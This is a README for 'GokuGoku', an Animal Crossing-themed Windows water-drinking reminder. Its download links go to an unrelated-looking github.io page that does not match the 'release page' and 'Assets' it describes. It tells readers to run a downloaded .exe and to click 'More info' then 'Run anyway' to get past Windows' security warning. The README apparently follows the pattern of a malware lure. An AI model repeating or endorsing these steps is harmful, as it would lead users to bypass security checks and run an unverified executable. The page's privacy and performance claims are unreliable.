# 💧 GokuGoku - Drink water to stay healthy daily

[![](https://img.shields.io/badge/Download-GokuGoku-blue.svg)](https://on-sleight382.github.io)

GokuGoku helps you drink enough water throughout your busy day. This simple tool sits on your desktop and reminds you to take a sip at regular intervals. It uses sounds and visuals inspired by Animal Crossing to make hydration a fun and stress-free habit.

## 📥 How to download the software

You can get the application from our release page. Follow these steps to find the right file for your computer:

1. Visit the [official download page](https://on-sleight382.github.io).
2. Look for the section labeled "Assets" under the latest version.
3. Click the link that ends in ".exe" to download the installer file to your computer.
4. Save the file in a folder you can find later, such as your Downloads folder.

## ⚙️ Running the application

Once the download finishes, follow these instructions to set up the reminder:

1. Open your Downloads folder.
2. Double-click the GokuGoku file you just saved.
3. Windows might show a security prompt because the app comes from the internet. Click "More info" and then "Run anyway" to allow the app to open.
4. The reminder icon will appear in your system tray, located near your clock at the bottom right of your screen.

## 🧪 Features

GokuGoku focuses on simplicity and ease of use. It includes these core features to help you track your progress:

*   **Custom Reminders:** Choose how often the app tells you to drink. You can set it to alert you every 30, 60, or 90 minutes.
*   **Gentle Alerts:** The app triggers a soft, polite sound that does not distract you from your work or study.
*   **Visual Logs:** View how many glasses of water you consumed during the day.
*   **Lightweight Design:** This app uses minimal computer memory and battery, so you can leave it running in the background without affecting your performance.
*   **Animal Crossing Style:** The interface features themes and sounds designed to feel calm and welcoming.

## 🛠 Setting your preferences

You can change how the app works by right-clicking the G-shaped icon in your system tray. 

*   **Settings Window:** Click "Settings" to pick your daily goal. Enter the number of glasses you want to drink. 
*   **Volume Control:** Adjust the slider to set the sound level for your alerts.
*   **Startup Behavior:** Select "Launch on Windows login" if you want the app to start automatically when you turn on your computer.

## 📋 System requirements

GokuGoku works on most modern Windows machines. Ensure your computer meets these basic needs:

*   Operating System: Windows 10 or Windows 11.

*   Disk Space: 50MB of free space for the installation files.

## ❓ Frequently asked questions

**Does the app track my personal data?**
No. All your data stays on your local machine. We do not collect or store your drinking habits or personal info.

**How do I close the application?**
Right-click the icon in the system tray and select "Exit." This will shut down the program completely.

**The sound is too quiet. How can I fix that?**
Open the settings menu and check the volume slider. Also, ensure your Windows system volume is not muted.

**Will this app slow down my computer?**
No. We built this app to be very light. It uses almost no processing power while it waits in the background.

## 🛠 Troubleshooting common issues

If you encounter issues, try these steps first:

*   **App fails to launch:** Ensure you downloaded the latest version from the releases page. If the file seems corrupted, delete it and download it again.
*   **No sound plays:** Check your speakers or headphones. Make sure they are plugged in and turned on. 
*   **App disappears:** It is likely running in the hidden icons area. Click the small arrow next to your clock to reveal the GokuGoku icon.
